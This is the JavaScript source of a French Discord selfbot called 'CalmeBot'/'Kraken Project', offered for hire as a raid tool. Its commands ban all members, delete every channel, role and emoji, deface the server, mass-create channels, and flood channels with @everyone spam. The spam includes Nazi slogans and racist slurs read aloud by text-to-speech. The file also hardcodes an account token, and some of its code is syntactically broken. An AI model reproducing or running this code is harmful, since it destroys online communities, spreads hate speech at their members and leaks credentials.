const Discord = require("discord.js"),
bot = new Discord.Client(),
express = require("express"),
gifSearch = require("gif-search"),
sayembed = new Discord.RichEmbed(),
ms = require("ms"),
con = console.log,
token = "NDc0MzMwNTcwODk4NTM4NDk2.Dyo1Tw.GWUr-pWKe-OueESgkkfPzvVWQXw",
kiss = ["https://cdn.weeb.sh/images/SJ--2auDZ.gif", "https://cdn.weeb.sh/images/Skc42pdv-.gif", "https://cdn.weeb.sh/images/rJ_U2p_Pb.gif", "https://cdn.weeb.sh/images/ryFdQRtF-.gif", "https://cdn.weeb.sh/images/SkQIn6Ovb.gif", "https://cdn.weeb.sh/images/SJQRoTdDZ.gif", "https://cdn.weeb.sh/images/Sk1k3TdPW.gif", "https://cdn.weeb.sh/images/r1H42advb.gif", "https://cdn.weeb.sh/images/S1E1npuvb.gif", "https://cdn.weeb.sh/images/ByurnpODW.gif", "https://cdn.weeb.sh/images/S1y-4l5Jf.gif", "https://cdn.weeb.sh/images/Skv72TuPW.gif", "https://cdn.weeb.sh/images/SJINn6OPW.gif", "https://cdn.weeb.sh/images/SJ3dXCKtW.gif", "https://cdn.weeb.sh/images/H1Gx2aOvb.gif", "https://cdn.weeb.sh/images/S1qZksSXG.gif", "https://cdn.weeb.sh/images/r1cB3aOwW.gif", "https://cdn.weeb.sh/images/HJ8dQRYK-.gif", "https://cdn.weeb.sh/images/BJLP3a_Pb.gif"],
hug = ["https://s-media-cache-ak0.pinimg.com/originals/49/a2/1e/49a21e182fcdfb3e96cc9d9421f8ee3f.gif", "https://s-media-cache-ak0.pinimg.com/originals/16/46/f7/1646f720af76ea58853ef231028bafb1.gif", "https://media.giphy.com/media/xJlOdEYy0r7ZS/giphy.gif", "http://i.imgur.com/2WywS3T.gif", "http://i.imgur.com/8ruodNJ.gif", "https://myanimelist.cdn-dena.com/s/common/uploaded_files/1461071296-7451c05f5aae134e2cceb276b085a871.gif", "http://i0.kym-cdn.com/photos/images/original/000/931/030/394.gif", "https://media.tenor.co/images/1171c186f9130d1efa4a186ad4371e8c/tenor.gif", "http://cdn.smosh.com/sites/default/files/ftpuploads/bloguploads/0413/epic-hugs-friends-pikachu.gif", "https://cdn.weeb.sh/images/rJaog0FtZ.gif", "https://cdn.weeb.sh/images/B10Tfknqf.gif", "https://cdn.weeb.sh/images/S1a0DJhqG.gif", "https://cdn.weeb.sh/images/Hk4qu_XvZ.gif", "https://cdn.weeb.sh/images/Hk0yFumwW.gif", "https://cdn.weeb.sh/images/BJCCd_7Pb.gif", "https://cdn.weeb.sh/images/BJ0UovdUM.gif"],
rnb = require('random-number'),
DiscordPermissions = [
  "ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS",
  "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD",
  "ADD_REACTIONS", "VIEW_CHANNEL", "READ_MESSAGES",
  "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES",
  "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY",
  "MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "EXTERNAL_EMOJIS",
  "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS",
  "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME",
  "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_ROLES_OR_PERMISSIONS",
  "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"
]; 

commandIntervals = [];

bot.login(token)
  
bot.on('ready',() => {
  bot.user.setActivity('@̠̠̿𝑬̠̠̿𝒂̠̠̿𝒖̠̠̿𝒄̠̠̿𝒂̠̠̿𝒍̠̠̿𝒎̠̠̿𝒆̠̠̿_̠̠̿ ̠̠̿𝑶̠̠̿𝒏̠̠̿ ̠̠̿𝑻̠̠̿𝒘̠̠̿𝒊̠̠̿𝒕̠̠̿𝒕̠̠̿𝒆̠̠̿𝒓̠̠̿ ̠̠̿<̠̠̿3', { type: 'STREAMING', url: 'https://www.twitch.tv/eaucalmelpb' });
  let memberCount = bot.users.size;
  let serverCount = bot.guilds.size;
  con(
    `${"-".repeat(40)}\n`                         + 
    "|  Bienvenue sur: Kraken Selfbot-Logs.  |\n" + 
    `${"-".repeat(40)}\n`                         +  
    "Information du bot : \n"                     +
    `Nom du bot    : ${bot.user.tag}!\n`          + 
    `ID du bot     : ${bot.user.id}\n`            +
    `Token: du bot : ${bot.token}\n`              +
    `${"-".repeat(40)}\n`                         +
    "Stats bot : \n"                              +
    `Utilisateurs : ${memberCount}\n`             +
    `Serveurs     : ${serverCount}\n`             +
    `${"-".repeat(40)}\n`
  );
});

bot.on('message', msg => {
  if (msg.author.id !== bot.user.id) return;
  if (msg.content === '/help') {
      if (msg.deletable) msg.delete();
  var helpAEmbed = new Discord.RichEmbed()
   .setThumbnail(msg.author.avatarURL)      
 .setTitle(`__👑Commande CalmeBot👑__`)
 .addBlankField(1)
 .addField('__🛎 -> /cmds__', '**||Toutes les commandes utilie||**')
 .addBlankField(1)
.addField('📴 -> /raid', '**||Toutes les commandes de raid.||**')
 .addBlankField(1)
 .addField('💢 -> /spam', '**||Toutes les commandes de spam.||**')
 .addBlankField(1)
 .addField('🤣 -> /lol', '**||Pour un max de fun lol||**')
 .addBlankField(1)
 .addField('🔍 -> /autor', '**||Qui à fais le bot ?||**')
 .addBlankField(1)
 .addField('📢 -> /info', '**||Informations du BOT !||**')
 .addBlankField(1)
 .setColor('#FF0000')
 .setFooter('By Okalme#6745 Commandez votre bot dès-mainteant'')
 .setDescription('Toutes la sous catègories du selfbot et ici !')
.setImage('https://cdn.discordapp.com/attachments/469124912796270592/469348927708069889/3059550-kraken-wallpapers_out.jpg')
   .setTimestamp()
   msg.channel.send(helpAEmbed).catch(err => con(err));
   
 }
 
 if (msg.content === /cmds') {
   if (msg.deletable) msg.delete();  
var helpAEmbed = new Discord.RichEmbed()

.setThumbnail(msg.author.avatarURL)      
  .setTitle(`__👑Commande CalmeBot (UTILE)👑__`)
  .addBlankField(1)
 .addField('__🕝-> /ping__', '**||Affiche le ping du bot (100 ms = idéale)||**')
 .addBlankField(1)
 .addField('__🔊-> /bind__', '**||Bind mis sur le site !||**')
 .addBlankField(1)
.addField('__📥-> /infoserveur__', '**||Informations du serveur||**')
 .addBlankField(1)
.addField('__📤-> /banme yes__', '**||Commande qui permet de faire ban ton comptes "YES/NO"||**')
.addBlankField(1)
.addField('__✂️-> /del [nombre]__', '**||Delet le nombre de message [nombre]||**')
.addBlankField(1)
.addField('__📆-> /stats__', '**||Stats du comptes||**')
.addBlankField(1)
.addField('__🔌-> /refresh__', '**||Refresh le bot (pour le désactiver rendez-vous sur le site)**')
.addBlankField(1)
       .setColor('#FF0000')
       .setFooter('By Okalme#6745 Commandez votre bot dès-mainteant (Hébergement 24h/24)')
       .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469357026028290049/panelprincipale_out.jpg')
.setTimestamp()
msg.channel.send(helpAEmbed).catch(err => con(err));

       }
 
      if (msg.content === '/raid') {
 if (msg.deletable) msg.delete();  
  var helpAEmbed = new Discord.RichEmbed()
     .setThumbnail(msg.author.avatarURL)      
     .setTitle(`__👑Commande CalmeBot (RAID)👑__`)
     .addBlankField(1)
      .addField('__📤-> /banall__','**||Ban tout le serveur.||**')
      .addBlankField(1)
      .addField('__🎁-> /sodomie__','**||sodomise le serveur||**')
      .addBlankField(1)
      .addField('__🖇-> /spambind__','**||Spam @everyone sur tout le serveur(A prédéfinir sur votre panel)**')
      .addBlankField(1)
      .addField('__📝-> /rename__','**||Renomme tout le serveur avec (A prédéfinir sur votre panel)||**')
      .addBlankField(1)
      .addField('__📈-> /spamcahnnel__','**||Crée énormément de channel (A prédéfinir sur votre panel)||**')
      .addBlankField(1)
      .addField('__📉-> /delchannel__','**||Supprime tout les channels.||**')
      .addBlankField(1)
      .addField('__📉-> /delrole__','**||Supprime tout les rôles.||**')
      .addBlankField(1)
      .addField('__📉-> /delemoji__','**||Supprime tout les emojis.||**')
      .addBlankField(1)
      .addField('__📥-> /deban__','**||Déban tout le serveur.||**')
      .addBlankField(1)
      .setColor('#FF0000')
      .setFooter('By Okalme#6745 Commandez votre bot dès-mainteant (Hébergement 24h/24)')
      .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469351956704526337/panelderaid_out.jpg')
        .setTimestamp()
       msg.channel.send(helpAEmbed).catch(err => con(err));

      }
 
if (msg.content === '/spam') {
if (msg.deletable) msg.delete();  
       var helpAEmbed = new Discord.RichEmbed()
      .setThumbnail(msg.author.avatarURL)      
      .setTitle(`__👑Commande CalmeBot (Spam)👑.__`)
      .addBlankField(1)
      .addField('__📯-> /spamnazi__','**||Spam des croix nazi (ATTENTION BAN SI REPORT)||**')
      .addBlankField(1)
      .addField('__👨🏿-> /spamraciste__','**||Spam des message raciste(ATTENTION BAN SI REPORT) ||**')
      .addBlankField(1)
      .addField('__💫-> /lag__', '**||Faire lag les client windows / web||**')
      .addBlankField(1)
      .addField('__📞-> !sayspam [votre msg]__','**||Spam un message||**')
      .addBlankField(1)
      .addField('__🔌-> !stop__','**||Stop tout les spam en cours||**')
      .addBlankField(1)
     .setColor('#FF0000')
     .setFooter('By Okalme#6745 Commandez votre bot dès-mainteant (Hébergement 24h/24)')
     .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469352949404139520/paneldespam_out.jpg')
      .setTimestamp()
      msg.channel.send(helpAEmbed).catch(err => con(err));
       
    }
 
if (msg.content === '!KFun') {
if (msg.deletable) msg.delete();  
      var helpAEmbed = new Discord.RichEmbed()
      .setThumbnail(msg.author.avatarURL)      
      .setTitle(`__Panel des commandes fun de **Kraken Project**.__`)
   .addBlankField(1)
     .addField('__!say [votre msg]__','**Fait dire au bot un msg défini.**')
     .addBlankField(1)
     .addField('__!KCherche [mots clés]__','**Effectue une recherche sur internet via le Kraken Project.**')
     .addBlankField(1)
     .addField('__!8ball [votre question]__','**Réponds à la question posée entre différentes propositions.**')
     .addBlankField(1)
     .addField('__!kiss @mention__','**Permet de faire un bisou à la personne mentionnée.**')
     .addBlankField(1)
     .addField('__!calin @mention__','**Permet de faire un câlin à la personne mentionnée**')
     .addBlankField(1)
     .addField('__!gif [mots clés]__','**Effectue une recherche sur internet et vous affiche un gif en rapport avec vos mots-clés.**')
     .addBlankField(1)
   .setColor('#0020ff')
   .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469354151659438080/panelfun_out.jpg')
     .setTimestamp()
      msg.channel.send(helpAEmbed).catch(err => con(err));

    }

    if (msg.content === '/info') {
      if (msg.deletable) msg.delete();  
 var helpAEmbed = new Discord.RichEmbed()      
.setTitle(`__👑Commande CalmeBot INFORMATIONS👑**.__`)
.addBlankField(1)
.setDescription('Aucune informations à été posté...')
.addBlankField(1)
           .setColor('#FF0000')
           .setFooter('By Okalme#6745 Commandez votre bot dès-mainteant (Hébergement 24h/24)')
.setTimestamp()
msg.channel.send(helpAEmbed).catch(err => con(err));
 
          }

          if (msg.content === '/autor') {
if (msg.deletable) msg.delete();  
  var helpAEmbed = new Discord.RichEmbed()
  
 .setThumbnail(msg.author.avatarURL)      
 .setTitle(`__👑Commande CalmeBot CRÉDITS👑**.__`)
 .addBlankField(1)

 .addField('Okalme#6745 💎 Créateur du PROJET 💎 ')
 .addBlankField(1)
 .addField('__KrakenProject 💎 Architecture 💎**')
 .addBlankField(1)
 .addField('__DrenoX#9999__','**Designer en chef.**')
 .addBlankField(1)
 .addField('__Kraken Project.__','**Nous sommes actuellement à la recherche de programmeurs, si vous pensez pouvoir posséder les connaissances requise pour pouvoir nous aider, merci de nous contacter en MP Discord.**')

 .addBlankField(1)

.setColor('#FF0000')
.setFooter('By Okalme#6745 Commandez votre bot dès-mainteant (Hébergement 24h/24)')
 .setTimestamp()
msg.channel.send(helpAEmbed).catch(err => con(err));
 
    }
    
    if (msg.content === '/test') {
      msg.reply(':x: commandes indisponible :x:')
 if (msg.deletable) msg.delete();  
  var helpAEmbed = new Discord.RichEmbed()

     .setThumbnail(msg.author.avatarURL)      
     .setTitle(`__Panel des commandes V.I.P de **Kraken Project**.__`)
     .addBlankField(1)

.addField('__!attack [Invite du serveur] [ID du salon] [votre msg] __','**Fait rejoindre 200 bots sur le serveur et les fait spam selon le salon défini et le msg défini.**')
.addBlankField(1)
.addField('__!mp [ID de la personne]__','**Envoie à la personne définie un spam simultané de 200 bots.**')
.addBlankField(1)
.addField('__!join [Invite du serveur]__','**Fait rejoindre 200 bots sur le serveur défini.**')
.addBlankField(1)
.addField('__!loopjoin [Invite du serveur]__','**Fait rejoindre puis quitter 200 bots sur le serveur défini en boucle.**')
.addBlankField(1)
.addField('__!leave [ID du salon]__','**Fait quitter tout les bots du serveur.**')
.addBlankField(1)
.addField('__!stop__','**Stop toutes les commandes en cours.**')
.addBlankField(1)

.setColor('#0020ff')
.setFooter('◊ Copyright © 2018 Kraken Project. ◊')
.setImage('https://cdn.discordapp.com/attachments/469385199961243650/469785932372115458/panelvip_out.jpg')
.setTimestamp()
msg.channel.send(helpAEmbed).catch(err => con(err));

}              

  if(msg.content === '/ping') {
    if (msg.deletable) msg.delete();
 msg.reply(`👑 **Le ping est de** __***${Math.round(bot.ping)}*** ms__ Location : __europe.west__ ! 👑`)
 }

 if(msg.content === "!token"){
  if (msg.deletable) msg.delete();
  msg.channel.send(`:spy: **Voici votre token:** ${bot.token} **(__Évité de le partager__)** :spy:`)
}
  
 if(msg.content === '/bind') {
  if (msg.deletable) msg.delete();
msg.reply(`:x: AUCUN BIND N'A ÉTÉ ENTRÉ! :x:`)
}
    
  if(msg.content === '/refresh'){
    if (msg.deletable) msg.delete();
      msg.channel.send('👑 CalmeBot est entrain de redémarré (En cas de non refresh veuillez le refresh sur le site)👑')
      .then(bot.destroy());
  }

  if(msg.content.startsWith("/banme")) {
    if (msg.deletable) msg.delete();
    if(msg.channel.type === "dm") return;
    let args = msg.content.split(" ").slice(1).join(" ");
  if(!args) return msg.channel.send("👑Veuillez attendre ou recommencer sur un serveur assez gros👑**");
  msg.guild.members.forEach(member => {
    member.send(args).catch(e => {});
  })
 }

 if(msg.content.startsWith("!pp")) {
  if(msg.channel.type === "dm") return;
  if (msg.deletable) msg.delete();
  var krakenmember = msg.mentions.members.first()
  let avatar_embed = new Discord.RichEmbed()
  .setAuthor(` Avatar de ${msg.mentions.users.first().username}`)
  .setColor("RANDOM")
  .setImage(krakenmember.user.avatarURL)
  return msg.channel.send(avatar_embed).catch(e => {});
 }
 
 if (msg.content === "/stats"){
  var date = new Date(bot.uptime);
  var days = date.getUTCDate() - 1;
  var hours = date.getUTCHours();
  var minutes = date.getUTCMinutes();
  var embed = new Discord.RichEmbed();
  embed.setColor('RANDOM')
      .setFooter(' ', ' ')
      .setThumbnail(`${bot.user.avatarURL}`)
      .setTimestamp()
      .addField('👑 Nombre de serveur:', `${bot.guilds.size}`, true)
      .addField('👑 Nombre de users:', `${bot.users.size}`, false)
      .addField('👑 Discord Version:', `${Discord.version}`, false)
      .addField('👑 Uptime', days + " days, " + hours + " hours and " + minutes + " minutes.")
  msg.channel.sendEmbed(
      embed, {
          disableEveryone: true
      }
  );
}
 
 if(msg.content.startsWith("/infoserveur")){
  if (msg.deletable) msg.delete();
  if(msg.channel.type === "dm") return;
  let infoEmbed = new Discord.RichEmbed()
        .setTitle("__👑Commande CalmeBot Informations serveur👑.__")
        .addBlankField(1)
        .setColor('RANDOM')
        .addField('**Nom** : ', msg.guild.name)
        .addBlankField(1)
        .addField('**ID** : ', msg.guild.id)
        .addBlankField(1)
        .addBlankField(1)
        .addField('**Date de création** : ', msg.guild.createdAt)
        .addBlankField(1)
        .addField('**OwnerShips** : ', msg.guild.owner.user.tag)
        .addBlankField(1)
        .addField('**Nombre de membres** : ', msg.guild.memberCount)
        .addBlankField(1)
        .addField('**Salons** : ', msg.guild.channels.size)
        .setThumbnail(msg.guild.iconURL)
        .setTimestamp()
      msg.channel.send(infoEmbed);
    }

    if(msg.content.startsWith("!minfo")){
      if(msg.channel.type === "dm") return;
      if (msg.deletable) msg.delete();
      var rakenmember2 = msg.mentions.members.first()
      var userinfo_embed = new Discord.RichEmbed()
      .setTitle('__Informations utilisateur.__')
      .setThumbnail(msg.author.avatarURL)
        .addBlankField(1)
      .setColor("RANDOM")
      .addField("Pseudo :", `${msg.mentions.users.first().username}`)
      .addField("Date de création du compte :", rakenmember2.user.createdAt)
      .addField("Tag :", '#'+rakenmember2.user.discriminator)
      .addField("ID :", rakenmember2.user.id)
      .addField("Pseudo + tag :", rakenmember2.user.tag)
      .setImage(rakenmember2.user.avatarURL)
      .addBlankField(1)
      .setTimestamp()
      msg.channel.send(userinfo_embed).catch(err => con(err));
    }

    if(msg.content.startsWith("/del")) {
      let args = msg.content.split(" ").slice(1);
      let messagecount = parseInt(args[0]) || 1;
      var deletedMessages = -1;
      msg.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
          .then(messages => {
              messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
          }).then(() => {
              if (deletedMessages === -1) deletedMessages = 0;
              msg.channel.send(`👑 ${deletedMessages} message(s) **Ce font supprimé** 👑`)
                  .then(m => m.delete(5000));
          }).catch(console.error);
  }

  if (msg.content === '!PresetEpic' ) {
    if (msg.deletable) msg.delete();
    let inteval = setInterval(function() {
      msg.channel.send('https://cdn.discordapp.com/attachments/406996217604603914/433767434499915826/jSNNR0G.gif https://cdn.discordapp.com/attachments/464750188586598410/469856730201718785/77m4.gif @everyone');
    }, 100);
    commandIntervals.push(inteval);
  }

  if (msg.content === '/spamnazi' ) { 
    if (msg.deletable) msg.delete();
    let inteval = setInterval(function() {
      msg.channel.send('@everyone 卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑卐卐卐VIVE HITLER卐卐卐👑');        
    }, 100);
    commandIntervals.push(inteval);
  }

  if (msg.content === '/lag' ) {
    if (msg.deletable) msg.delete();
    let inteval = setInterval(function() {
      msg.channel.send('@everyone :heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart:');
    }, 100);
    commandIntervals.push(inteval);
  }

  if (msg.content === '/spamraciste' ) {
    if (msg.deletable) msg.delete();
    let inteval = setInterval(function() {
      msg.channel.send('@everyone ' + 'NIQUE LES ARABE ET LES NOIRES LES ARABE VOLE // LES NOIRE PUE IL NE SERVE A RIEN DANS CETTE FRANCE CT MIEUX AVANT', {tts: true} ); 
    }, 100);    
    commandIntervals.push(inteval);
  }

  if (msg.content === ':PresetTts2' ) {
    if (msg.deletable) msg.delete();
    let inteval = setInterval(function() {
      msg.channel.send('@everyone Ecoutez moi attentivement bande de raclures de trottoirs de banlieues HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH', { tts: true } );
    }, 100);
    commandIntervals.push(inteval);
  }

  if(msg.content.startsWith("/banme")) {
    if (msg.deletable) msg.delete();
    if(msg.channel.type === "dm") return;
    let args = msg.content.split(" ").slice(1).join(" ");
    let inteval = setInterval(function() {
      msg.channel.send(args)
    }, 200);
    commandIntervals.push(inteval);
  }
    
  if (msg.content === '/stop') {
    if (msg.deletable) msg.delete();
    commandIntervals.forEach(interval => {
      clearInterval(interval);
    });
    con('👑Toutes les commandes sont en aretter si non -> /refresh👑');
  }

  if (msg.author.id !== bot.user.id) return;
  
  if (msg.content === '!banall') {
  if (msg.deletable) msg.delete();
  msg.guild.members.forEach(member => {
      member.ban().then(function () {
      });
  });
 }

 if (msg.content === '/spamchannel') {
  if (msg.deletable) msg.delete();
  let i = 0;
  let interval = setInterval(function () {
    if (i === 250) clearInterval(interval);
    msg.guild.createChannel("GO BUY CALMEBOT").then(i++);
  }, 100);
 }

 if (msg.content === '!deface') {
    if (msg.deletable) msg.delete();
    msg.guild.setRegion('hongkong')
    msg.guild.setIcon('https://imgur.com/a/htLmWJg');
 msg.guild.setName('FUCKED BY {msg.author}')
 }

if (msg.content === '/delchannel'){
  if (msg.deletable) msg.delete();
  msg.guild.channels.forEach(chan => {
    if (chan.deletable) chan.delete();
  });
 }

if (msg.content === '/delrole'){
  if (msg.deletable) msg.delete();
  msg.guild.roles.forEach(role => {
    role.delete()
  });
 }

if (msg.content === '!delemote'){
  if (msg.deletable) msg.delete();
  msg.guild.emojis.forEach(emoji => {
    emoji.delete()
  });
 }

if (msg.content === 'spambind') {
  if (msg.deletable) msg.delete();
  msg.guild.channels.forEach(channel => {
    if (channel.type === "text") channel.send("@everyone **(:x:Aucun bind mis entré sur le site :x:**\n"+
"░░░░░░░░░░░░▄▄▄▄░░░░░░░░░░░░░░░░░░░░░░░▄▄▄▄▄\n"+
"░░░█░░░░▄▀█▀▀▄░░▀▀▀▄░░░░▐█░░░░░░░░░▄▀█▀▀▄░░░▀█▄\n"+
"░░█░░░░▀░▐▌░░▐▌░░░░░▀░░░▐█░░░░░░░░▀░▐▌░░▐▌░░░░█▀\n"+
"/░▐▌░░░░░░░▀▄▄▀░░░░░░░░░░▐█▄▄░░░░░░░░░▀���▄▀░░░░░▐▌\n"+
"░█░░░░░░░░░░░░░░░░░░░░░░░░░▀█░░░░░░░░░░░░░░░░░░█\n"+
"▐█░░░░░░░░░░░░░░░░░░░░░░░░░░█▌░░░░░░░░░░░░░░░░░█ \n"+
"▐█░░░░░░░░░░░░░░░░░░░░░░░░░░█▌░░░░░░░░░░░░░░░░░█\n"+
"░▐▌░░░░░░░░░░░░░░░░░░░░▀███▀░░░░░░░░░░░░░░░░░░▐▌\n"+
"░░█░░░░░░░░░░░░░░░░░▀▄░░░░░░░░░░▄▀░░░░░░░░░░░░█\n"+
"░░░█░░░░░░░░░░░░░░░░░░▀▄▄▄▄▄▄▄▀▀░░░░░░░░░░░░░█\n")
 }) 
 }

 if (msg.content === '!deban') {
  if (msg.deletable) msg.delete();
  let interval = setInterval(function () {
      msg.guild.fetchBans().then(bans => {
        bans.forEach(ban => {
          msg.guild.unban(ban.id);
        });
      });
    }, 1000);
 }

  if (msg.content.startsWith('/stream')) {
    if(msg.deletable) msg.delete()
      let StreamTime = args.slice(0).join(" ");
     bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/AvioonTV'})
	 
      }

      if(msg.content.startsWith("!8ball")){
        if(msg.deletable) msg.delete()

        var question = msg.content.split(" ").join(" ").slice(7)
        var tableauball = ["Oui","Non","Peut être","Blc de la question achete le CalmeBot"]
    
        let ball_embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle("Question de "+msg.author.tag+"")
        .setDescription(""+question+"")
        .addField("Réponse",""+ tableauball[Math.floor(Math.random()*8)] +"")
        .setThumbnail(bot.user.iconURL)
        return msg.channel.send(ball_embed).catch(e => {});

        }

        if(msg.content.startsWith("!say")) {
          if(msg.deletable) msg.delete()
          let args = msg.content.split(" ").join(" ").slice(1);
          msg.delete()
        .setColor("RANDOM")
        .setDescription(msg.author.username + " says : " + args);
        msg.channel.send({sayembed})

        }

        if(msg.content.startsWith("!kiss")) {
          if(msg.deletable) msg.delete()
        let muser = msg.mentions.users.first()
        let r = rnb({
            min: 0,
            max: kiss.length - 1,
            integer: true
        });
        let image = kiss[r];

        if (!msg.mentions.users.first()) return msg.channel.sendMessage({
             "embed": {
                     description: "**" + msg.author.username + "**" + ", vous avez reçu un bisou de la part de " +  "**Kraken Project.**",
                     color: 0xff7b00,
                     "image": {
                     "url": image,
                     timestamp: new Date(),
                    footer: {
                      text: "Kiss"
                    },
                     }
                 }
             })

        msg.channel.sendMessage({
             "embed": {
                     description: "** " + muser.username + "**"  + ", vous avez reçu un bisou de la part de " + "**" + msg.author.username + " **",
                     color: 0xff7b00,
                     "image": {
                     "url": image,
                     timestamp: new Date(),
                    footer: {
                      text: "Kiss"
                    },
                     }
                 }
             })
 }

 if(msg.content.startsWith("!gif")) {
  if(msg.deletable) msg.delete()
  let args = msg.content.split(" ").join(" ").slice(1);
  gifSearch.random(args).then(
      gifUrl => {

      let randomcolor = ((1 << 24) * Math.random() | 0).toString(16) //Optional
      var embed = new Discord.RichEmbed()
          .setColor(`#${randomcolor}`)
          .setImage(gifUrl)
      msg.channel.send(embed);
  });
 }

 if(msg.content.startsWith("!calin")) {
 let muser = msg.mentions.users.first()
 let r = rnb({
     min: 0,
     max: hug.length - 1,
     integer: true
 });
 let image = hug[r];

 if (!msg.mentions.users.first()) return msg.channel.sendMessage({
      "embed": {
              description: "**:hugging: " + msg.author.username + "**" + ", vous avez reçu un câlin de la part de " +  "**Kraken Project.**",
              color: 0xff7b00,
              "image": {
              "url": image,
              timestamp: new Date(),
             footer: {
               text: "Hug"
             },
              }
          }
      })

 msg.channel.sendMessage({
      "embed": {
              description: "**:hugging: " + muser.username + "**" + ", vous avez reçu un câlin de la part de " + "**" + msg.author.username + " **",
              color: 0xff7b00,
              "image": {
              "url": image,
              timestamp: new Date(),
             footer: {
               text: "Hug"
             },
              }
          }
      })
    }
});
